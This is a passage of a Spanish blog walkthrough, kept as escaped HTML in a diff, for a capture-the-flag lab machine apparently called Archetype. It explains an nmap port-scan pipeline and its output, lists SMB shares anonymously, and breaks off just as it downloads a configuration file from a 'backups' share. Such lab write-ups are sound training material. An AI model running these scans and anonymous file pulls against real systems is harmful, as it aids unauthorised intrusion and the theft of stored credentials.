+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;ports&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;nmap -p- --min-rate&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;  -T4 &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27 &lt;span class="p"&gt;|&lt;/span&gt; grep ^&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;-9&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d &lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; -f &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; tr &lt;span class="s1"&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed s/,$//&lt;span class="k"&gt;)&lt;/span&gt;
+nmap -sC -sV -p&lt;span class="nv"&gt;$ports&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a revisar la primera&amp;nbsp;linea.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;ports&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;nmap -p- --min-rate&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;  -T4 &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27 &lt;span class="p"&gt;|&lt;/span&gt; grep ^&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;-9&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d &lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; -f &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; tr &lt;span class="s1"&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed s/,$//&lt;span class="k"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;La linea anterior crea una variable en &lt;code&gt;bash&lt;/code&gt; llamada &lt;code&gt;ports&lt;/code&gt; en la cual se
+almacena el resultado de
+&lt;code&gt;nmap -p- --min-rate=1000  -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;El comando anterior se componen de la salida anidada entre varios comandos,
+esto podemos observarlo con el uso de &lt;code&gt;comando1 | comando2&lt;/code&gt;, el cual indica
+que la salida del &lt;code&gt;comando1&lt;/code&gt; será la entrada del &lt;code&gt;comando2&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Separando el comando nos encontramos&amp;nbsp;con:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;nmap -p- --min-rate=1000 -T4 10.10.10.27&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;grep ^[0-9]&lt;/code&gt;:&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;cut -d '/' -f 1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;tr '\n' ','&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;sed s/,$//&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Analicemos cada una de las&amp;nbsp;partes.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;nmap -p- --min-rate=1000 -T4 10.10.10.27&lt;/code&gt; lo vamos a utilizar para detectar
+los puertos abiertos en la máquina a trabajar. Esto se lo indicamos a &lt;code&gt;nmap&lt;/code&gt;
+con los siguientes&amp;nbsp;parámetros:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-p-&lt;/code&gt;: Indicamos que vamos a escanear todos los puertos de la&amp;nbsp;máquina.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--min-rate=1000&lt;/code&gt;: Indicamos que enviaremos al menos 1000 paquetes por segundos para realizar el&amp;nbsp;escaneo.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-T4&lt;/code&gt;: Indicamos una &lt;em&gt;plantilla de tiempo&lt;/em&gt;. Básicamente le decimos a &lt;code&gt;nmap&lt;/code&gt;
+que haga un &lt;em&gt;análisis agresivo&lt;/em&gt;. El modo agresivo hace que los
+análisis sean más rápidos al asumir que estas en una red razonablemente más
+rápida y&amp;nbsp;fiable.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;10.10.10.27&lt;/code&gt;: Indicamos la &lt;span class="caps"&gt;IP&lt;/span&gt; del objetivo, en este caso es la máquina con la que vamos a&amp;nbsp;trabajar.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;La salida del comando anterior nos muestra la lista de puertos abiertos como
+se ve a&amp;nbsp;continuación.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Starting Nmap &lt;span class="m"&gt;7&lt;/span&gt;.80 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2020&lt;/span&gt;-08-06 &lt;span class="m"&gt;21&lt;/span&gt;:35 CDT
+Warning: &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27 giving up on port because retransmission cap hit &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.088s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+Not shown: &lt;span class="m"&gt;63625&lt;/span&gt; closed ports, &lt;span class="m"&gt;1899&lt;/span&gt; filtered ports
+PORT      STATE SERVICE
+&lt;span class="m"&gt;135&lt;/span&gt;/tcp   open  msrpc
+&lt;span class="m"&gt;139&lt;/span&gt;/tcp   open  netbios-ssn
+&lt;span class="m"&gt;445&lt;/span&gt;/tcp   open  microsoft-ds
+&lt;span class="m"&gt;1433&lt;/span&gt;/tcp  open  ms-sql-s
+&lt;span class="m"&gt;5985&lt;/span&gt;/tcp  open  wsman
+&lt;span class="m"&gt;47001&lt;/span&gt;/tcp open  winrm
+&lt;span class="m"&gt;49664&lt;/span&gt;/tcp open  unknown
+&lt;span class="m"&gt;49665&lt;/span&gt;/tcp open  unknown
+&lt;span class="m"&gt;49666&lt;/span&gt;/tcp open  unknown
+&lt;span class="m"&gt;49667&lt;/span&gt;/tcp open  unknown
+&lt;span class="m"&gt;49668&lt;/span&gt;/tcp open  unknown
+
+Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="m"&gt;121&lt;/span&gt;.13 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;La salida anterior la pasamos a &lt;code&gt;grep ^[0-9]&lt;/code&gt; para que nos muestre solamente
+el listado de lineas donde aparecen puertos, esto para quitar la información
+extra de &lt;code&gt;nmap&lt;/code&gt;. Esto se lo indicamos a &lt;code&gt;grep&lt;/code&gt; utilizando la expresión regular
+&lt;code&gt;^[0-9]&lt;/code&gt; la cual especifica que busque las lineas que comienzan con valores
+numéricos que van del 0 al 9. La salida es como se muestra a&amp;nbsp;continuación.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="m"&gt;135&lt;/span&gt;/tcp   open  msrpc
+&lt;span class="m"&gt;139&lt;/span&gt;/tcp   open  netbios-ssn
+&lt;span class="m"&gt;445&lt;/span&gt;/tcp   open  microsoft-ds
+&lt;span class="m"&gt;1433&lt;/span&gt;/tcp  open  ms-sql-s
+&lt;span class="m"&gt;5985&lt;/span&gt;/tcp  open  wsman
+&lt;span class="m"&gt;47001&lt;/span&gt;/tcp open  winrm
+&lt;span class="m"&gt;49664&lt;/span&gt;/tcp open  unknown
+&lt;span class="m"&gt;49665&lt;/span&gt;/tcp open  unknown
+&lt;span class="m"&gt;49666&lt;/span&gt;/tcp open  unknown
+&lt;span class="m"&gt;49667&lt;/span&gt;/tcp open  unknown
+&lt;span class="m"&gt;49668&lt;/span&gt;/tcp open  unknown
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;La salida anterior la pasamos a &lt;code&gt;cut -d '/' -f 1&lt;/code&gt; para que extraiga
+exclusivamente el número de los puertos abiertos. Esto se lo indicamos a &lt;code&gt;cut&lt;/code&gt;
+con los siguientes&amp;nbsp;parámetros:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-d '/'&lt;/code&gt;: Indicamos el carácter delimitador. Esto vendría a ser nuestro
+carácter para &lt;em&gt;separar&lt;/em&gt; la cadena en &lt;em&gt;columna&lt;/em&gt;, Algo así como la coma &lt;code&gt;,&lt;/code&gt; de
+un &lt;span class="caps"&gt;CSV&lt;/span&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-f 1&lt;/code&gt;: Indicamos que retorne o imprima el primer campo de los resultados.
+En este caso si observamos la salida del comando anterior podemos asumir que
+las lineas de texto se van a separar en dos columnas debido a que cada linea
+tiene el carácter &lt;code&gt;/&lt;/code&gt;. El primer campo tendrá el número de puerto y el segundo
+campo tendrá la descripción del&amp;nbsp;puerto.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;La salida del comando anterior es la&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="m"&gt;135&lt;/span&gt;
+&lt;span class="m"&gt;139&lt;/span&gt;
+&lt;span class="m"&gt;445&lt;/span&gt;
+&lt;span class="m"&gt;1433&lt;/span&gt;
+&lt;span class="m"&gt;5985&lt;/span&gt;
+&lt;span class="m"&gt;47001&lt;/span&gt;
+&lt;span class="m"&gt;49664&lt;/span&gt;
+&lt;span class="m"&gt;49665&lt;/span&gt;
+&lt;span class="m"&gt;49666&lt;/span&gt;
+&lt;span class="m"&gt;49667&lt;/span&gt;
+&lt;span class="m"&gt;49668&lt;/span&gt;
+&lt;span class="m"&gt;49669&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;La salida anterior la pasamos a &lt;code&gt;tr '\n' ','&lt;/code&gt; para eliminar los caracteres
+&lt;code&gt;\n&lt;/code&gt; y sustituirlos por una coma &lt;code&gt;,&lt;/code&gt;. El resultado es el&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="m"&gt;135&lt;/span&gt;,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;La salida anterior la pasamos a &lt;code&gt;sed s/,$//&lt;/code&gt; para simplemente extraer la
+ultima coma y dejar una lista limpia de puertos abiertos separados por comas.
+Esto lo hacemos con la expresión &lt;code&gt;s/,$//&lt;/code&gt; la cual se pasa a &lt;code&gt;sed&lt;/code&gt; que respeta
+la sintaxis &lt;code&gt;s/regexp/replacement/flags&lt;/code&gt;. La expresión utilizada busca la
+última coma de la linea y la&amp;nbsp;borra.&lt;/p&gt;
+&lt;p&gt;La salida del comando anterior es la&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="m"&gt;135&lt;/span&gt;,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Todo lo anterior es simplemente para entender el primer comando del
+walk-through que básicamente nos arma una lista de puertos abiertos separados
+por&amp;nbsp;comas.&lt;/p&gt;
+&lt;p&gt;Esta lista de puertos quedo almacenada en la variable &lt;code&gt;ports&lt;/code&gt; que vamos a
+utilizar en el segundo comando&amp;nbsp;recomendado:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nmap -sC -sV -p&lt;span class="nv"&gt;$ports&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;El comando anterior realizará un escaneo en los puertos obtenidos del primer
+comando. La bandera &lt;code&gt;-sV&lt;/code&gt; indica a &lt;code&gt;nmap&lt;/code&gt; que determine la versión del software
+detectado en el puerto. La salida del comando&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Starting Nmap &lt;span class="m"&gt;7&lt;/span&gt;.80 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2020&lt;/span&gt;-08-06 &lt;span class="m"&gt;22&lt;/span&gt;:36 CDT
+Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.50s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+
+PORT      STATE SERVICE      VERSION
+&lt;span class="m"&gt;135&lt;/span&gt;/tcp   open  msrpc        Microsoft Windows RPC
+&lt;span class="m"&gt;139&lt;/span&gt;/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+&lt;span class="m"&gt;445&lt;/span&gt;/tcp   open  microsoft-ds Windows Server &lt;span class="m"&gt;2019&lt;/span&gt; Standard &lt;span class="m"&gt;17763&lt;/span&gt; microsoft-ds
+&lt;span class="m"&gt;1433&lt;/span&gt;/tcp  open  ms-sql-s     Microsoft SQL Server &lt;span class="m"&gt;2017&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt;.00.1000.00&lt;span class="p"&gt;;&lt;/span&gt; RTM
+&lt;span class="p"&gt;|&lt;/span&gt; ms-sql-ntlm-info:
+&lt;span class="p"&gt;|&lt;/span&gt;   Target_Name: ARCHETYPE
+&lt;span class="p"&gt;|&lt;/span&gt;   NetBIOS_Domain_Name: ARCHETYPE
+&lt;span class="p"&gt;|&lt;/span&gt;   NetBIOS_Computer_Name: ARCHETYPE
+&lt;span class="p"&gt;|&lt;/span&gt;   DNS_Domain_Name: Archetype
+&lt;span class="p"&gt;|&lt;/span&gt;   DNS_Computer_Name: Archetype
+&lt;span class="p"&gt;|&lt;/span&gt;_  Product_Version: &lt;span class="m"&gt;10&lt;/span&gt;.0.17763
+&lt;span class="p"&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class="nv"&gt;commonName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;SSL_Self_Signed_Fallback
+&lt;span class="p"&gt;|&lt;/span&gt; Not valid before: &lt;span class="m"&gt;2020&lt;/span&gt;-08-06T09:11:31
+&lt;span class="p"&gt;|&lt;/span&gt;_Not valid after:  &lt;span class="m"&gt;2050&lt;/span&gt;-08-06T09:11:31
+&lt;span class="p"&gt;|&lt;/span&gt;_ssl-date: &lt;span class="m"&gt;2020&lt;/span&gt;-08-07T03:54:35+00:00&lt;span class="p"&gt;;&lt;/span&gt; +16m19s from scanner time.
+&lt;span class="m"&gt;5985&lt;/span&gt;/tcp  open  http         Microsoft HTTPAPI httpd &lt;span class="m"&gt;2&lt;/span&gt;.0 &lt;span class="o"&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;span class="p"&gt;|&lt;/span&gt;_http-title: Not Found
+&lt;span class="m"&gt;47001&lt;/span&gt;/tcp open  http         Microsoft HTTPAPI httpd &lt;span class="m"&gt;2&lt;/span&gt;.0 &lt;span class="o"&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;span class="p"&gt;|&lt;/span&gt;_http-title: Not Found
+&lt;span class="m"&gt;49664&lt;/span&gt;/tcp open  msrpc        Microsoft Windows RPC
+&lt;span class="m"&gt;49665&lt;/span&gt;/tcp open  msrpc        Microsoft Windows RPC
+&lt;span class="m"&gt;49666&lt;/span&gt;/tcp open  msrpc        Microsoft Windows RPC
+&lt;span class="m"&gt;49667&lt;/span&gt;/tcp open  msrpc        Microsoft Windows RPC
+&lt;span class="m"&gt;49668&lt;/span&gt;/tcp open  msrpc        Microsoft Windows RPC
+&lt;span class="m"&gt;49669&lt;/span&gt;/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server &lt;span class="m"&gt;2008&lt;/span&gt; R2 - &lt;span class="m"&gt;2012&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+&lt;span class="p"&gt;|&lt;/span&gt;_clock-skew: mean: 1h40m18s, deviation: 3h07m51s, median: 16m17s
+&lt;span class="p"&gt;|&lt;/span&gt; ms-sql-info:
+&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="m"&gt;10&lt;/span&gt;.10.10.27:1433:
+&lt;span class="p"&gt;|&lt;/span&gt;     Version:
+&lt;span class="p"&gt;|&lt;/span&gt;       name: Microsoft SQL Server &lt;span class="m"&gt;2017&lt;/span&gt; RTM
+&lt;span class="p"&gt;|&lt;/span&gt;       number: &lt;span class="m"&gt;14&lt;/span&gt;.00.1000.00
+&lt;span class="p"&gt;|&lt;/span&gt;       Product: Microsoft SQL Server &lt;span class="m"&gt;2017&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;       Service pack level: RTM
+&lt;span class="p"&gt;|&lt;/span&gt;       Post-SP patches applied: &lt;span class="nb"&gt;false&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;_    TCP port: &lt;span class="m"&gt;1433&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt; smb-os-discovery:
+&lt;span class="p"&gt;|&lt;/span&gt;   OS: Windows Server &lt;span class="m"&gt;2019&lt;/span&gt; Standard &lt;span class="m"&gt;17763&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Windows Server &lt;span class="m"&gt;2019&lt;/span&gt; Standard &lt;span class="m"&gt;6&lt;/span&gt;.3&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;   Computer name: Archetype
+&lt;span class="p"&gt;|&lt;/span&gt;   NetBIOS computer name: ARCHETYPE&lt;span class="se"&gt;\x&lt;/span&gt;&lt;span class="m"&gt;00&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;   Workgroup: WORKGROUP&lt;span class="se"&gt;\x&lt;/span&gt;&lt;span class="m"&gt;00&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt;_  System time: &lt;span class="m"&gt;2020&lt;/span&gt;-08-06T20:54:29-07:00
+&lt;span class="p"&gt;|&lt;/span&gt; smb-security-mode:
+&lt;span class="p"&gt;|&lt;/span&gt;   account_used: guest
+&lt;span class="p"&gt;|&lt;/span&gt;   authentication_level: user
+&lt;span class="p"&gt;|&lt;/span&gt;   challenge_response: supported
+&lt;span class="p"&gt;|&lt;/span&gt;_  message_signing: disabled &lt;span class="o"&gt;(&lt;/span&gt;dangerous, but default&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt; smb2-security-mode:
+&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="m"&gt;2&lt;/span&gt;.02:
+&lt;span class="p"&gt;|&lt;/span&gt;_    Message signing enabled but not required
+&lt;span class="p"&gt;|&lt;/span&gt; smb2-time:
+&lt;span class="p"&gt;|&lt;/span&gt;   date: &lt;span class="m"&gt;2020&lt;/span&gt;-08-07T03:54:26
+&lt;span class="p"&gt;|&lt;/span&gt;_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="m"&gt;84&lt;/span&gt;.18 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Hasta este momento ya hemos logrado detectar los puertos abiertos así como el
+software y las versiones que están asociados a&amp;nbsp;estos.&lt;/p&gt;
+&lt;p&gt;Por ahora el post quedara hasta aquí &amp;#8230; tengo hambre y necesito descansar un&amp;nbsp;rato.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Continuación:&amp;nbsp;2020-08-11&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Listo, ya he comido algo (y ya pasaron algunos días), así que podemos&amp;nbsp;continuar.&lt;/p&gt;
+&lt;p&gt;Retomando, podemos observar que el puerto 445 y el 1433 se encuentran abiertos
+y están asociados a dos servicios:
+&lt;a href="https://es.wikipedia.org/wiki/Server_Message_Block"&gt;&lt;span class="caps"&gt;SMB&lt;/span&gt;&lt;/a&gt; y
+&lt;a href="https://es.wikipedia.org/wiki/Microsoft_SQL_Server"&gt;&lt;span class="caps"&gt;SQL&lt;/span&gt; Server&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Dado que el protocolo &lt;code&gt;SMB&lt;/code&gt; se utiliza para compartir archivos podemos tratar de
+conectarnos de manera anonima en busqueda de archivos interesantes. Para esto
+recomiendan utilizar &lt;code&gt;smbclient&lt;/code&gt; la cual es un cliente de conexiones
+perteneciente al proyecto
+&lt;a href="https://es.wikipedia.org/wiki/Samba_(software)"&gt;Samba&lt;/a&gt; en sistemas tipo &lt;code&gt;Unix&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;El comando recomendado&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smbclient -N -L &lt;span class="se"&gt;\\\\&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.10.27&lt;span class="se"&gt;\\&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Los parámetros del comando anterior&amp;nbsp;son:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-N&lt;/code&gt;: Conectar sin contraseña (de manera&amp;nbsp;anónima).&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-L&lt;/code&gt;: Despliega los resultados en formato de&amp;nbsp;lista.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;\\\\10.10.10.27\\&lt;/code&gt;: Estamos indicando la máquina a la cual nos vamos a
+conectar. En este caso nos estamos conectando desde un sistema tipo &lt;code&gt;Unix&lt;/code&gt; a un
+sistema basado en &lt;code&gt;DOS&lt;/code&gt; por lo cual utilizaremos la sintaxis de
+&lt;code&gt;DOS&lt;/code&gt; la cual requiere barras invertidas (&lt;code&gt;\&lt;/code&gt;). Al estar en un sistema
+tipo &lt;code&gt;Unix&lt;/code&gt; tenemos que escapar la barra invertida con una barra invertida
+(&lt;code&gt;\\\\&lt;/code&gt;), por eso al inicio vemos cuatro barras invertidas y dos al final, en
+realidad la sintaxis de &lt;code&gt;DOS&lt;/code&gt; lo tomaría como dos barras al inicio y una al&amp;nbsp;final.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;El resultado del comando anterior&amp;nbsp;es:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;    Sharename       Type      Comment
+    ---------       ----      -------
+    ADMIN$          Disk      Remote Admin
+    backups         Disk      
+    C$              Disk      Default share
+    IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Revisando la salida del comando podemos observar que hay una carpeta interesante
+llamada &lt;code&gt;backups&lt;/code&gt; la cual podria contener información interesante. Procederemos
+a conectarnos a esa carpeta con el comando&amp;nbsp;recomendado:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smbclient -N &lt;span class="se"&gt;\\\\&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.10.27&lt;span class="se"&gt;\\&lt;/span&gt;backups
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;De igual manera que en el comando anterior, nos vamos a conectar sin contraseña
+gracias al parámetro &lt;code&gt;-N&lt;/code&gt; y hemos eliminado el parámetro &lt;code&gt;-L&lt;/code&gt; ya que no queremos
+ver una lista de resultados si no realizar una conexión&amp;nbsp;directa.&lt;/p&gt;
+&lt;p&gt;Al conectarnos tendremos una terminal como la&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Try &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt; to get a list of possible commands.
+smb: \&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;En esta terminal podemos ejecutar comandos básicos, para ver un listado de
+estos podemos utilizar &lt;code&gt;help&lt;/code&gt; el cual nos desplegará una salida como la&amp;nbsp;siguiente:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smb: \&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; help
+?              allinfo        altname        archive        backup         
+blocksize      cancel         case_sensitive cd             chmod          
+chown          close          del            deltree        dir            
+du             echo           exit           get            getfacl        
+geteas         hardlink       help           history        iosize         
+lcd            link           lock           lowercase      ls             
+l              mask           md             mget           mkdir          
+more           mput           newer          notify         open           
+posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
+posix_unlink   posix_whoami   print          prompt         put            
+pwd            q              queue          quit           readlink       
+&lt;span class="k"&gt;rd&lt;/span&gt;             recurse        reget          rename         reput          
+rm             rmdir          showacls       setea          setmode        
+scopy          stat           symlink        tar            tarmode        
+timeout        translate      unlock         volume         vuid           
+wdel           logon          listconnect    showconnect    tcon           
+tdis           tid            utimes         logoff         ..             
+!  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Como el objetivo en este momento es encontrar información de utilidad se nos
+recomienda utilizar el comando &lt;code&gt;dir&lt;/code&gt; el cual permite listar el contenido de un
+directorio en sistemas basados en &lt;code&gt;DOS&lt;/code&gt;, este caso, el directorio&amp;nbsp;actual.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smb: \&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; dir
+  .                                   D        0  Mon Jan 20 06:20:57 2020
+  ..                                  D        0  Mon Jan 20 06:20:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 06:23:02 2020
+
+        10328063 blocks of size 4096. 8243763 blocks available
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Del contenido del directorio podemos observar que solamente existe el archivo
+&lt;code&gt;prod.dtsConfig&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Los archivos con extensión
+&lt;a href="https://abrirarchivos.info/extension/dtsconfig"&gt;.dtsConfig&lt;/a&gt;
+son archivos de configuración con sintaxis &lt;code&gt;XML&lt;/code&gt; utilizados para aplicar
+&lt;em&gt;valores de propiedad&lt;/em&gt; a los paquetes de
+&lt;em&gt;Servicios de Integración de &lt;span class="caps"&gt;SQL&lt;/span&gt; Server&lt;/em&gt; (&lt;code&gt;SSIS&lt;/code&gt;). Por lo cual podemos obtener
+algo de información de este&amp;nbsp;archivo.&lt;/p&gt;
+&lt;p&gt;Para ver el contenido del archivo nos recomiendan utilizar el siguiente&amp;nbsp;comando:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smb: \&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; get prod.dtsConfig
